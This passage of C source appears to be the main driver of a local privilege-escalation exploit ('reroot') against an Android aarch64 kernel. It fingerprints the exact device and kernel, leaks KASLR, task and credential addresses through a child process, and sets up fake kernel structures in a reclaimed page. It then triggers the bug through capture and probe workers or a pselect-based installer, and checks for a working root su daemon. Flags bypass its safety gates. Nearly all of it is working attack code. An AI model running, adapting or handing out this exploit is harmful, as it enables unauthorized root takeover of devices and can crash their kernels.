      }
    }
    if (holder) {
      drain_child(holder, helper_line, helper_state);
      reap_child(holder);
    }
    drain_child(probe, NULL, NULL);
    reap_child(probe);
    if (any_success && probe->exited && probe->fd < 0) {
      return 0;
    }
    if (all_captures_exited && probe->exited && probe->fd < 0) {
      return 0;
    }
  }
  return -1;
}

static int all_required_files_present(int need_target, int need_probe) {
  if (need_target) {
    const char *paths[] = {REMOTE_TARGET, REMOTE_PRELOAD};
    for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); ++i) {
      struct stat st;
      if (stat(paths[i], &st) != 0 || !S_ISREG(st.st_mode)) {
        fprintf(stderr, "[reroot] missing artifact %s\n", paths[i]);
        return 0;
      }
    }
    if (access(REMOTE_TARGET, X_OK) != 0) {
      fprintf(stderr, "[reroot] target is not executable\n");
      return 0;
    }
  }
  if (need_probe) {
    struct stat st;
    if (stat(REMOTE_PROBE, &st) != 0 || !S_ISREG(st.st_mode)) {
      fprintf(stderr, "[reroot] missing artifact %s\n", REMOTE_PROBE);
      return 0;
    }
    if (access(REMOTE_PROBE, X_OK) != 0) {
      fprintf(stderr, "[reroot] probe is not executable\n");
      return 0;
    }
  }
  return 1;
}

static int target_profile_matches(void) {
  struct utsname uts;
  if (uname(&uts) != 0) {
    perror("[reroot] uname");
    return 0;
  }
  char device[PROP_VALUE_MAX] = {0};
  char sdk[PROP_VALUE_MAX] = {0};
  char fingerprint[PROP_VALUE_MAX] = {0};
  __system_property_get("ro.product.device", device);
  __system_property_get("ro.build.version.sdk", sdk);
  __system_property_get("ro.build.fingerprint", fingerprint);
  int release_ok =
      strncmp(uts.release, EXPECTED_KERNEL_RELEASE,
              strlen(EXPECTED_KERNEL_RELEASE)) == 0;
  int device_ok = strcmp(device, EXPECTED_DEVICE) == 0;
  int sdk_ok = strcmp(sdk, EXPECTED_SDK) == 0;
  int version_ok = strcmp(uts.version, EXPECTED_KERNEL_VERSION) == 0;
  int fingerprint_ok = strcmp(fingerprint, EXPECTED_FINGERPRINT) == 0;
  printf("[reroot] PROFILE machine=%s release=%s device=%s sdk=%s "
         "release_ok=%d version_ok=%d device_ok=%d sdk_ok=%d "
         "fingerprint_ok=%d\n",
         uts.machine, uts.release, device, sdk, release_ok, version_ok,
         device_ok, sdk_ok, fingerprint_ok);
  return strcmp(uts.machine, "aarch64") == 0 && release_ok && device_ok &&
         sdk_ok && version_ok && fingerprint_ok;
}

int main(int argc, char **argv) {
  unsigned target_hold_sec = 900;
  unsigned page_hold_sec = 240;
  int force = 0;
  int validate_only = 0;
  int preflight_only = 0;
  int observe_only = 0;
  int legacy_route = 0;
  int route_override = 0;
  int allow_weak_holder = 0;
  struct gate_state gates = {0};
  for (int i = 1; i < argc; ++i) {
    int gate_rc = 0;
    if (strcmp(argv[i], "--force") == 0) {
      force = 1;
    } else if (strcmp(argv[i], "--validate-only") == 0) {
      validate_only = 1;
    } else if (strcmp(argv[i], "--preflight-only") == 0) {
      preflight_only = 1;
    } else if (strcmp(argv[i], "--observe-only") == 0) {
      observe_only = 1;
    } else if (strcmp(argv[i], "--legacy-route") == 0) {
      legacy_route = 1;
      route_override = 1;
    } else if (strcmp(argv[i], "--t878u-pselect-route") == 0) {
      legacy_route = 0;
      route_override = 1;
    } else if (strcmp(argv[i], "--allow-weak-holder") == 0) {
      allow_weak_holder = 1;
    } else if ((gate_rc =
                    parse_gate_value(argv[i], "--gate-abi=", &gates.abi_gate)) >
               0) {
      continue;
    } else if (gate_rc < 0) {
      return 2;
    } else if ((gate_rc = parse_gate_value(argv[i], "--gate-overlap=",
                                           &gates.overlap_gate)) > 0) {
      continue;
    } else if (gate_rc < 0) {
      return 2;
    } else if ((gate_rc = parse_gate_value(argv[i], "--gate-identity=",
                                           &gates.identity_gate)) > 0) {
      continue;
    } else if (gate_rc < 0) {
      return 2;
    } else if ((gate_rc = parse_gate_value(argv[i], "--gate-consumer=",
                                           &gates.consumer_gate)) > 0) {
      continue;
    } else if (gate_rc < 0) {
      return 2;
    } else if (strncmp(argv[i], "--target-hold-sec=", 18) == 0) {
      target_hold_sec = (unsigned)strtoul(argv[i] + 18, NULL, 0);
    } else if (strncmp(argv[i], "--page-hold-sec=", 16) == 0) {
      page_hold_sec = (unsigned)strtoul(argv[i] + 16, NULL, 0);
    } else if (strcmp(argv[i], "--help") == 0) {
      printf("usage: %s [--force] [--preflight-only] [--validate-only] "
             "[--observe-only [--legacy-route [--allow-weak-holder]]] "
             "[--legacy-route | "
             "--t878u-pselect-route] "
             "[--gate-abi=0|1] [--gate-overlap=0|1] "
             "[--gate-identity=0|1] [--gate-consumer=0|1] "
             "[--target-hold-sec=N] "
             "[--page-hold-sec=N]\n",
             argv[0]);
      return 0;
    } else {
      fprintf(stderr, "unknown argument: %s\n", argv[i]);
      return 2;
    }
  }
  if (target_hold_sec < 60 || page_hold_sec < 60) {
    fprintf(stderr, "[reroot] hold times must be at least 60 seconds\n");
    return 2;
  }
  if (observe_only && (preflight_only || validate_only)) {
    fprintf(stderr, "[reroot] --observe-only cannot be combined with "
                    "diagnostic-only modes\n");
    return 2;
  }
  if ((preflight_only || validate_only) && legacy_route) {
    fprintf(stderr, "[reroot] legacy route cannot be combined with "
                    "diagnostic-only modes\n");
    return 2;
  }
  if (!route_override && !preflight_only && !validate_only) {
    /* T878U 64-bit pselect is a diagnostic oracle here, not a viable installer. */
    legacy_route = 1;
  }
  if (observe_only && !legacy_route) {
    fprintf(stderr, "[reroot] --observe-only currently supports only the "
                    "legacy holder/probe route\n");
    return 2;
  }
  if (allow_weak_holder &&
      (!legacy_route || (!observe_only && !force))) {
    fprintf(stderr, "[reroot] --allow-weak-holder requires "
                    "--legacy-route with either --observe-only or --force\n");
    return 2;
  }
  finalize_gate_state(&gates);

  setvbuf(stdout, NULL, _IOLBF, 0);
  setvbuf(stderr, NULL, _IOLBF, 0);
  signal(SIGINT, on_signal);
  signal(SIGTERM, on_signal);
  signal(SIGHUP, on_signal);

  char boot_id[128] = "unknown";
  read_first_line("/proc/sys/kernel/random/boot_id", boot_id, sizeof(boot_id));
  printf("[reroot] START boot_id=%s pid=%d uid=%d gid=%d pure_c=1\n", boot_id,
         getpid(), getuid(), getgid());

  if (!force && !preflight_only && !validate_only && !observe_only &&
      existing_root_works()) {
    printf("[reroot] SUCCESS already_root=1 boot_id=%s\n", boot_id);
    return 0;
  }
  if (!target_profile_matches()) {
    fprintf(stderr, "[reroot] refusing unsupported kernel/device profile\n");
    return 1;
  }
  const char *route = route_name(legacy_route, observe_only);
  log_gate_state(&gates, route, observe_only);
  if (!preflight_only && !validate_only && !gates.write_gate) {
    log_no_go(&gates, route, observe_only ? "observe-only" : "write-gate");
    if (!observe_only && !force) {
      return 1;
    }
    if (force) {
      printf("[reroot] FORCE_BYPASS route=%s blocked_write_gate=%d\n",
             route, gates.write_gate);
    }
  }
  if (preflight_only) {
    printf("[reroot] PREFLIGHT_OK boot_id=%s\n", boot_id);
    return 0;
  }
  if (!all_required_files_present(1, legacy_route && (!observe_only || allow_weak_holder))) {
    return 1;
  }
  if (!validate_only) {
    printf("[reroot] ROUTE full=%s\n", route);
  }
  unsigned capture_workers = configured_capture_workers();

  struct child_proc target;
  struct child_proc holder;
  struct child_proc captures[CAPTURE_WORKERS];
  struct child_proc probe;
  child_init(&target);
  child_init(&holder);
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    child_init(&captures[i]);
  }
  child_init(&probe);
  struct target_state target_state;
  memset(&target_state, 0, sizeof(target_state));
  int result = 1;

  if (spawn_target(&target, target_hold_sec) != 0) {
    perror("[reroot] spawn target");
    goto cleanup;
  }
  if (wait_for_child_condition(&target, TARGET_READY_TIMEOUT_MS, target_line,
                               &target_state, &target_state.ready) != 0) {
    fprintf(stderr, "[reroot] target leak did not become ready\n");
    goto cleanup;
  }
  printf("[reroot] LEAK_OK kaslr_base=0x%016" PRIx64
         " task=0x%016" PRIx64 " cred=0x%016" PRIx64
         " cred_hits=%u base_hits=%u\n",
         target_state.kaslr_base, target_state.task, target_state.cred,
         target_state.cred_hits, target_state.base_hits);

  /*
   * validate-only still exercises reclaim/hold gates.  Full root uses the
   * in-process pselect residual-waiter install after KASLR only.
   */
  if (validate_only) {
    struct helper_state helper_state;
    memset(&helper_state, 0, sizeof(helper_state));
    int helper_ok = 0;
    for (unsigned attempt = 1; attempt <= HELPER_ATTEMPTS; ++attempt) {
      printf("[reroot] HOLDER attempt=%u/%u\n", attempt, HELPER_ATTEMPTS);
      memset(&helper_state, 0, sizeof(helper_state));
      if (spawn_holder(&holder, target_state.kaslr_base, page_hold_sec,
                       attempt) != 0) {
        perror("[reroot] spawn holder");
        goto cleanup;
      }
      int wait_rc = wait_for_child_condition(
          &holder, HELPER_TIMEOUT_MS, helper_line, &helper_state,
          &helper_state.hold_ready);
      int fresh_base_ok =
          helper_state.hold_ready &&
          ((helper_state.fresh_candidate & ~UINT64_C(0x7fff)) ==
               helper_state.hold_base ||
           (helper_state.fresh_candidate & ~UINT64_C(0xfff)) ==
               helper_state.hold_base);
      int layout_ok =
          helper_state.hold_ready &&
          helper_state.fake_lock >= helper_state.hold_base &&
          helper_state.fake_lock < helper_state.hold_base + UINT64_C(0x8000) &&
          helper_state.fake_task >= helper_state.hold_base &&
          helper_state.fake_task < helper_state.hold_base + UINT64_C(0x8000) &&
          helper_state.fake_fops >= helper_state.hold_base &&
          helper_state.fake_fops < helper_state.hold_base + UINT64_C(0x8000);
      helper_ok = wait_rc == 0 && helper_state.fresh_ok && fresh_base_ok &&
                  layout_ok && helper_state.hold_ready;
      if (helper_ok) {
        break;
      }
      fprintf(stderr,
              "[reroot] HOLDER_REJECT fresh=%d order=%d pfn=%d content=%d "
              "hold=%d fresh_base=%d layout=%d matches=%u/%u "
              "next_partial_slabs=%u next_posttarget_sends=%u\n",
              helper_state.fresh_ok, helper_state.order_ok, helper_state.pfn_ok,
              helper_state.content_ok, helper_state.hold_ready, fresh_base_ok,
              layout_ok, helper_state.fresh_matches, helper_state.fresh_wanted,
              18U + attempt * 2U, 8192U + attempt * 1024U);
      stop_child(&holder);
      child_init(&holder);
    }
    if (!helper_ok) {
      fprintf(stderr, "[reroot] holder attempts exhausted\n");
      goto cleanup;
    }
    uint64_t linear_map_base = UINT64_C(0xffffffc000000000);
    printf("[reroot] HOLDER_OK base=0x%016" PRIx64
           " fake_task=0x%016" PRIx64 " fake_lock=0x%016" PRIx64
           " fake_fops=0x%016" PRIx64 " target_pfn=0x%" PRIx64
           " linear_map_base=0x%016" PRIx64 "\n",
           helper_state.hold_base, helper_state.fake_task,
           helper_state.fake_lock, helper_state.fake_fops,
           helper_state.target_pfn, linear_map_base);
    printf("[reroot] VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
           " task=0x%016" PRIx64 " cred=0x%016" PRIx64
           " linear_map_base=0x%016" PRIx64 "\n",
           boot_id, target_state.kaslr_base, target_state.task,
           target_state.cred, linear_map_base);
    result = 0;
    goto cleanup;
  }

  if (legacy_route) {
    struct helper_state helper_state;
    memset(&helper_state, 0, sizeof(helper_state));
    int helper_ok = 0;
    int weak_pfn = 0;
  const char *assume_page_offset_pfn =
        getenv("IONSTACK_ASSUME_PAGE_OFFSET_PFN");
    int assume_page_offset_pfn_enabled =
        !assume_page_offset_pfn || !*assume_page_offset_pfn ||
        strcmp(assume_page_offset_pfn, "0") != 0;
    for (unsigned attempt = 1; attempt <= HELPER_ATTEMPTS; ++attempt) {
      printf("[reroot] HOLDER attempt=%u/%u route=legacy allow_weak=%d\n",
             attempt, HELPER_ATTEMPTS, allow_weak_holder);
      memset(&helper_state, 0, sizeof(helper_state));
      if (spawn_holder(&holder, target_state.kaslr_base, page_hold_sec,
                       attempt) != 0) {
        perror("[reroot] spawn holder");
        goto cleanup;
      }
      int wait_rc = wait_for_child_condition(
          &holder, HELPER_TIMEOUT_MS, helper_line, &helper_state,
          &helper_state.hold_ready);
      int fresh_base_ok =
          helper_state.hold_ready &&
          ((helper_state.fresh_candidate & ~UINT64_C(0x7fff)) ==
               helper_state.hold_base ||
           (helper_state.fresh_candidate & ~UINT64_C(0xfff)) ==
               helper_state.hold_base);
      int layout_ok =
          helper_state.hold_ready &&
          helper_state.fake_lock >= helper_state.hold_base &&
          helper_state.fake_lock < helper_state.hold_base + UINT64_C(0x8000) &&
          helper_state.fake_task >= helper_state.hold_base &&
          helper_state.fake_task < helper_state.hold_base + UINT64_C(0x8000) &&
          helper_state.fake_fops >= helper_state.hold_base &&
          helper_state.fake_fops < helper_state.hold_base + UINT64_C(0x8000);
      if (!helper_state.pfn_ok && helper_state.hold_ready &&
          assume_page_offset_pfn_enabled &&
          helper_state.hold_base >= UINT64_C(0xffffffc000000000) &&
          ((helper_state.hold_base - UINT64_C(0xffffffc000000000)) &
           UINT64_C(0xfff)) == 0) {
        helper_state.target_pfn =
            (helper_state.hold_base - UINT64_C(0xffffffc000000000)) >> 12;
        helper_state.alloc_pfn = helper_state.target_pfn;
        helper_state.pfn_ok = 1;
        fprintf(stderr,
                "[reroot] HOLDER_ASSUME_PAGE_OFFSET_PFN base=0x%016" PRIx64
                " target_pfn=0x%" PRIx64 "\n",
                helper_state.hold_base, helper_state.target_pfn);
      }
      int strict_ok = wait_rc == 0 && helper_state.fresh_ok &&
                      fresh_base_ok && layout_ok &&
                      helper_state.order_ok && helper_state.pfn_ok &&
                      helper_state.content_ok && helper_state.hold_ready;
      int weak_ok = wait_rc == 0 && helper_state.fresh_ok && fresh_base_ok &&
                    layout_ok && helper_state.content_ok &&
                    helper_state.hold_ready;
      helper_ok = strict_ok || (allow_weak_holder && weak_ok);
      weak_pfn = helper_ok && !strict_ok;
      if (helper_ok) {
        if (weak_pfn) {
          fprintf(stderr,
                  "[reroot] HOLDER_WEAK route=legacy order=%d pfn=%d; "
                  "probe may reboot this kernel\n",
                  helper_state.order_ok, helper_state.pfn_ok);
        }
        break;
      }
      fprintf(stderr,
              "[reroot] HOLDER_REJECT route=legacy wait=%d fresh=%d order=%d "
              "pfn=%d content=%d hold=%d fresh_base=%d layout=%d "
              "strict=%d weak=%d allow_weak=%d matches=%u/%u "
              "next_partial_slabs=%u next_posttarget_sends=%u\n",
              wait_rc, helper_state.fresh_ok, helper_state.order_ok,
              helper_state.pfn_ok, helper_state.content_ok,
              helper_state.hold_ready, fresh_base_ok, layout_ok, strict_ok,
              weak_ok, allow_weak_holder, helper_state.fresh_matches,
              helper_state.fresh_wanted, 18U + attempt * 2U,
              8192U + attempt * 1024U);
      stop_child(&holder);
      child_init(&holder);
    }
    if (!helper_ok) {
      fprintf(stderr,
              "[reroot] holder attempts exhausted before legacy probe; "
              "no unsafe trigger was run\n");
      if (observe_only) {
        fprintf(stderr,
                "[reroot] blocked_identity reason=holder_not_verified\n");
        printf("[reroot] OBSERVATION_OK boot_id=%s route=%s helper_ok=0 "
               "weak_pfn=0 trace_dumped=0 probe_rc=-1\n",
               boot_id, route);
        result = 0;
      }
      goto cleanup;
    }

    printf("[reroot] HOLDER_OBS route=legacy hold_base=0x%016" PRIx64
           " fake_task=0x%016" PRIx64 " fake_lock=0x%016" PRIx64
           " fake_fops=0x%016" PRIx64 " binwrite_target=0x%016" PRIx64
           " target_pfn=0x%" PRIx64 " alloc_pfn=0x%" PRIx64
           " weak_pfn=%d order=%d pfn=%d content=%d\n",
           helper_state.hold_base, helper_state.fake_task,
           helper_state.fake_lock, helper_state.fake_fops,
           helper_state.binwrite, helper_state.target_pfn,
           helper_state.alloc_pfn, weak_pfn, helper_state.order_ok,
           helper_state.pfn_ok, helper_state.content_ok);

    if (observe_only) {
      struct trace_session trace_session;
      char trace_reason[128] = {0};
      int probe_rc = -1;

      if (!allow_weak_holder) {
        printf("[reroot] OBSERVATION_OK boot_id=%s route=%s helper_ok=1 "
               "weak_pfn=%d trace_dumped=0 probe_rc=-1\n",
               boot_id, route, weak_pfn);
        result = 0;
        goto cleanup;
      }

      if (tracefs_begin_capture(&trace_session, trace_reason,
                                sizeof(trace_reason)) != 0) {
        fprintf(stderr, "[reroot] trace_unavailable reason=%s\n",
                trace_reason[0] ? trace_reason : "unknown");
        fprintf(stderr,
                "[reroot] blocked_consumer reason=trace_required_for_consumer_observation\n");
        printf("[reroot] OBSERVATION_OK boot_id=%s route=%s helper_ok=1 "
               "weak_pfn=%d trace_dumped=0 probe_rc=-1\n",
               boot_id, route, weak_pfn);
        result = 0;
        goto cleanup;
      }
      if (spawn_probe(&probe, &helper_state, &target_state, 0) != 0) {
        perror("[reroot] spawn probe");
        tracefs_end_capture(&trace_session);
        goto cleanup;
      }
      printf("[reroot] TRIGGER mode=consumer-only probe_pid=%d weak_pfn=%d\n",
             probe.pid, weak_pfn);
      if (wait_for_child_exit(&probe, CAPTURE_TIMEOUT_MS) != 0) {
        fprintf(stderr, "[reroot] blocked_consumer reason=probe_timeout\n");
      }
      probe_rc = child_exit_code(&probe);
      tracefs_end_capture(&trace_session);
      printf("[reroot] TRIGGER_DONE mode=consumer-only probe_rc=%d "
             "trace_dumped=%d weak_pfn=%d\n",
             probe_rc, trace_session.dumped, weak_pfn);
      printf("[reroot] OBSERVATION_OK boot_id=%s route=%s helper_ok=1 "
             "weak_pfn=%d trace_dumped=%d probe_rc=%d\n",
             boot_id, route, weak_pfn, trace_session.dumped, probe_rc);
      result = 0;
      goto cleanup;
    }

    uint64_t linear_map_base = UINT64_C(0xffffffc000000000);
    uint64_t pfn_address = helper_state.target_pfn << 12;
    if (helper_state.hold_base < pfn_address) {
      fprintf(stderr, "[reroot] invalid direct-map derivation\n");
      goto cleanup;
    }
    linear_map_base = helper_state.hold_base - pfn_address;
    if ((linear_map_base & 0xfffU) != 0 ||
        (linear_map_base >> 40) != UINT64_C(0xffffff)) {
      fprintf(stderr, "[reroot] invalid linear-map base=0x%016" PRIx64 "\n",
              linear_map_base);
      goto cleanup;
    }
    printf("[reroot] HOLDER_OK route=legacy base=0x%016" PRIx64
           " fake_task=0x%016" PRIx64 " fake_lock=0x%016" PRIx64
           " fake_fops=0x%016" PRIx64 " target_pfn=0x%" PRIx64
           " linear_map_base=0x%016" PRIx64 " order=%d pfn=%d content=%d\n",
           helper_state.hold_base, helper_state.fake_task,
           helper_state.fake_lock, helper_state.fake_fops,
           helper_state.target_pfn, linear_map_base, helper_state.order_ok,
           helper_state.pfn_ok, helper_state.content_ok);

    struct capture_state capture_states[CAPTURE_WORKERS];
    memset(capture_states, 0, sizeof(capture_states));
    for (unsigned i = 0; i < capture_workers; ++i) {
      if (spawn_capture(&captures[i], i, &target_state, &helper_state,
                        linear_map_base) != 0) {
        perror("[reroot] spawn capture worker");
        goto cleanup;
      }
      printf("[reroot] CAPTURE_WORKER index=%u pid=%d\n", i,
             captures[i].pid);
    }
    sleep_ms(500);
    if (spawn_probe(&probe, &helper_state, &target_state, 1) != 0) {
      perror("[reroot] spawn probe");
      goto cleanup;
    }
    printf("[reroot] TRIGGER mode=legacy-capture-probe capture_workers=%u "
           "probe_pid=%d weak_pfn=%d\n",
           capture_workers, probe.pid, weak_pfn);

    if (wait_captures_and_probe(captures, capture_states, capture_workers,
                                &probe, &holder, &helper_state) != 0) {
      fprintf(stderr, "[reroot] capture/probe timeout\n");
      goto cleanup;
    }
    int probe_rc = child_exit_code(&probe);
    unsigned capture_results = 0;
    unsigned capture_successes = 0;
    unsigned capture_su_ready = 0;
    for (size_t i = 0; i < capture_workers; ++i) {
      capture_results += capture_states[i].saw_result ? 1U : 0U;
      capture_successes += capture_states[i].saw_result &&
                                   capture_states[i].ok &&
                                   capture_states[i].restore_ok
                               ? 1U
                               : 0U;
      capture_su_ready += capture_states[i].su_ready ? 1U : 0U;
    }
    printf("[reroot] TRIGGER_DONE mode=legacy-capture-probe workers=%u "
           "results=%u successes=%u su_ready=%u probe_rc=%d\n",
           capture_workers, capture_results, capture_successes,
           capture_su_ready, probe_rc);
    if (probe_rc != 0 || capture_successes == 0) {
      fprintf(stderr, "[reroot] write-only root capture failed\n");
      goto cleanup;
    }

    for (size_t i = 0; i < capture_workers; ++i) {
      stop_child(&captures[i]);
    }

    if (!target_state.root_ready) {
      if (wait_for_child_condition(&target, ROOT_READY_TIMEOUT_MS, target_line,
                                   &target_state,
                                   &target_state.root_ready) != 0) {
        fprintf(stderr, "[reroot] target did not launch root daemon\n");
        goto cleanup;
      }
    }
    if (!existing_root_works()) {
      fprintf(stderr, "[reroot] independent su verification failed\n");
      goto cleanup;
    }

    printf("[reroot] SUCCESS boot_id=%s kaslr_base=0x%016" PRIx64
           " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64
           " route=legacy weak_pfn=%d\n",
           boot_id, target_state.kaslr_base, target_state.cred,
           linear_map_base, weak_pfn);
    result = 0;
    goto cleanup;
  }

  struct child_proc installer;
  struct capture_state install_state;
  child_init(&installer);
  memset(&install_state, 0, sizeof(install_state));
  if (spawn_pselect_root(&installer, &target_state) != 0) {
    perror("[reroot] spawn pselect installer");
    goto cleanup;
  }
  printf("[reroot] TRIGGER mode=t878u-pselect-root installer_pid=%d "
         "kaslr_base=0x%016" PRIx64 "\n",
         installer.pid, target_state.kaslr_base);
  if (wait_pselect_root(&installer, &install_state) != 0) {
    fprintf(stderr,
            "[reroot] pselect installer timeout/fail saw_result=%d ok=%d "
            "su_ready=%d rc=%d\n",
            install_state.saw_result, install_state.ok, install_state.su_ready,
            child_exit_code(&installer));
    stop_child(&installer);
    goto cleanup;
  }
  printf("[reroot] TRIGGER_DONE mode=t878u-pselect-root ok=%d su_ready=%d "
         "rc=%d\n",
         install_state.ok, install_state.su_ready,
         child_exit_code(&installer));
  stop_child(&installer);

  if (!existing_root_works()) {
    fprintf(stderr, "[reroot] independent su verification failed\n");
    goto cleanup;
  }

  printf("[reroot] SUCCESS boot_id=%s kaslr_base=0x%016" PRIx64
         " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
         boot_id, target_state.kaslr_base, target_state.cred,
         UINT64_C(0xffffffc000000000));
  result = 0;

cleanup:
  stop_child(&probe);
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    stop_child(&captures[i]);
  }
  stop_child(&holder);
  stop_child(&target);
  if (result != 0) {
    fprintf(stderr, "[reroot] FAIL boot_id=%s\n", boot_id);
  }
  return result;
}
